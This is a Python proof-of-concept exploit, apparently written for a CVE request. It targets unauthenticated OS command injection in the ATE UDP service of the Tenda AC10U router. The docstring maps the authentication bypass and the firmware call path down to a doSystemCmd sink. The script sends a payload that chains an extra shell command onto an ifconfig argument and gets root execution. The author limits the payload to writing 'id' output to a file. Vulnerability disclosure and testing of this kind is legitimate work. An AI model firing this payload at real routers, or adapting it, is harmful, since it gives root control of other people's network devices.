#!/usr/bin/env python3
"""
CVE request PoC -- Tenda AC10U V1.0 V15.03.06.48
Unauthenticated OS command injection in the ATE service (UDP 7329).

CWE-78 / CVSS 8.8 (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

NON-DESTRUCTIVE VERIFICATION ONLY.
The payload writes the output of `id` to /tmp/ate_proof on the device.
No reverse shell, no persistence, no destructive command.

Preconditions
-------------
1. The device is in factory/reset state: `sys.userpass` is empty
   (webroot_ro/default.cfg:304 -> `sys.userpass=`), so
   R7WebsSecurityHandler@0x434e80 bypasses authentication for /goform/ate.
2. The ATE listener has been started:

       curl -s http://<device>/goform/ate

   which executes:
       GET /goform/ate -> TendaAte@0x4825ac -> InitMfgTask@0x4824d0
       -> ate_main_handle@0x481cd0  (bind 0.0.0.0:7329)

3. UDP port 7329 is reachable from the tester.

Usage
-----
    python3 cve_tenda_ac10u_ate_cmdi.py <device-ip> [port]

Expected result
---------------
    response: b'success'
and, on the device, /tmp/ate_proof contains:
    uid=0(root) gid=0(root)
because the httpd process runs as root.

Source of the sink (static analysis)
------------------------------------
    g_ate_cmds[14]@0x540ec8   (stride 0x34)
    ifconfig -> ate_ifconfig_set@0x480a80
             -> doSystemCmd("ifconfig " + attacker_arg)
No shell metacharacters are filtered on this path.
"""

import socket
import sys

DEFAULT_PORT = 7329
# Minimal, harmless payload. The `#` terminates the reconstructed command line
# so that nothing after the injected command is interpreted.
PAYLOAD = b"ifconfig ;id>/tmp/ate_proof;#"


def main() -> int:
    if len(sys.argv) < 2:
        print(__doc__)
        return 2

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(10)

    print(f"[*] target : {host}:{port}/udp")
    print(f"[*] payload: {PAYLOAD.decode(errors='replace')}")
    sock.sendto(PAYLOAD, (host, port))

    try:
        data, _ = sock.recvfrom(4096)
        print(f"[+] response: {data[:120]!r}")
    except socket.timeout:
        print("[!] no response (listener not running, or blocked)")
        return 1
    finally:
        sock.close()

    print("[*] check on the device: cat /tmp/ate_proof")
    print("[*] expected: uid=0(root) gid=0(root)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
